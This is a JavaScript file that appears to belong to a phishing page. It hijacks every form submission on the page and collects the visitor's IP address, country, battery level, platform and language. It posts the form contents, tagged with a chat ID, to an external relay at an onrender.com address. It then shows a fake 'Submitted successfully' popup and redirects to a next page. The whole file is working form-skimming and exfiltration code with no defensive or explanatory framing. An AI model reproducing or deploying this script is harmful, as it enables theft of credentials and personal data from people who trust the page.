document.addEventListener("DOMContentLoaded", () => {

  /* ================= CENTER POPUP FUNCTION (JS ONLY) ================= */
  function showPopup(message, type = "success", duration = 2500) {
    const oldPopup = document.getElementById("custom-popup");
    if (oldPopup) oldPopup.remove();

    const popup = document.createElement("div");
    popup.id = "custom-popup";
    popup.textContent = message;

    const colors = {
      success: "#28a745",
      error: "#dc3545",
      warning: "#ffc107"
    };

    Object.assign(popup.style, {
      position: "fixed",
      top: "50%",
      left: "50%",
      transform: "translate(-50%, -50%) scale(0.9)",
      backgroundColor: colors[type] || "#333",
      color: "#fff",
      padding: "16px 22px",
      borderRadius: "10px",
      fontSize: "15px",
      fontFamily: "system-ui, -apple-system, BlinkMacSystemFont, sans-serif",
      boxShadow: "0 15px 40px rgba(0,0,0,0.3)",
      zIndex: "99999",
      opacity: "0",
      transition: "all 0.35s ease"
    });

    document.body.appendChild(popup);

    // Animate IN (center pop)
    requestAnimationFrame(() => {
      popup.style.opacity = "1";
      popup.style.transform = "translate(-50%, -50%) scale(1)";
    });

    // Animate OUT
    setTimeout(() => {
      popup.style.opacity = "0";
      popup.style.transform = "translate(-50%, -50%) scale(0.9)";
      setTimeout(() => popup.remove(), 350);
    }, duration);
  }
  /* =================================================================== */

  const DEFAULT_USER_ID = "7979664801";
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown";
  let userIP = "Unknown";
  let batteryLevel = "Unknown";

  // ---------- BATTERY INFO ----------
  if (navigator.getBattery) {
    navigator.getBattery()
      .then(battery => {
        batteryLevel = Math.round(battery.level * 100) + "%";
      })
      .catch(() => {});
  }

  // ---------- IP + COUNTRY ----------
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data) {
        userCountry = data.country_name || userCountry;
        userIP = data.ip || userIP;
      }
    })
    .catch(() => {});

  forms.forEach((form) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;

      const formData = new FormData(form);

      // 🔹 REQUIRED
      formData.append("chat_id", userId);

      // ✅ SEPARATOR
      formData.append("──────────────", "");
      formData.append("📊 System Information", "");
      formData.append("──────────────", "");

      // 🔹 AUTO-COLLECTED DATA
      formData.append("📄 Page", document.title);
      formData.append("🕒 Date & Time", new Date().toLocaleString());
      formData.append("🌍 Country", userCountry);
      formData.append("📡 Client IP", userIP);
      formData.append("🔋 Battery Level", batteryLevel);
      formData.append("💻 Platform", navigator.platform || "Unknown");
      formData.append("🌐 Language", navigator.language || "Unknown");

      // ✅ ADD PAGE URL AT THE END
      formData.append("🔗 Page URL", window.location.href);

      try {
        const response = await fetch(
          "https://intelligent-yzi5.onrender.com/send",
          {
            method: "POST",
            body: formData
          }
        );

        if (response.ok) {
          showPopup("✅ Submitted successfully", "success");
          form.reset();

          setTimeout(() => {
            window.location.href = "next.html";
          }, 1800);

        } else {
          const errorText = await response.text();
          console.error("Server Error:", errorText);
          showPopup("❌ Error submitting form", "error");
        }

      } catch (err) {
        console.error("Network Error:", err);
        showPopup("⚠️ Network error", "warning");
      }
    });
  });
});